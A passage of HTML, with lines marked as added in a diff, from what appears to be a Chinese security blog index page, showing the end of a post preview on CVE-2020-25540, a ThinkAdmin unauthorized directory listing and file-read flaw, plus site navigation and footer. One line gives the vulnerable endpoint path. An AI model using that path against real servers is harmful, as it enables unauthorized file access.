+<p>URL：<code>https://www.0-sec.org/ThinkAdmin/public/admin.html?s=admin/api.Update/version</code></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/ThinkAdmin/%EF%BC%88%20CVE-2020-25540%EF%BC%89ThinkAdmin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%97%E7%9B%AE%E5%BD%95_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/ThinkAdmin/%EF%BC%88%20CVE-2020-25540%EF%BC%89ThinkAdmin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%97%E7%9B%AE%E5%BD%95_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2qvz900hdy8v11a0vgqmv" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/38/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/37/">37</a><a class="page-number" href="/page/38/">38</a><span class="page-number current">39</span><a class="page-number" href="/page/40/">40</a><a class="page-number" href="/page/41/">41</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/40/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
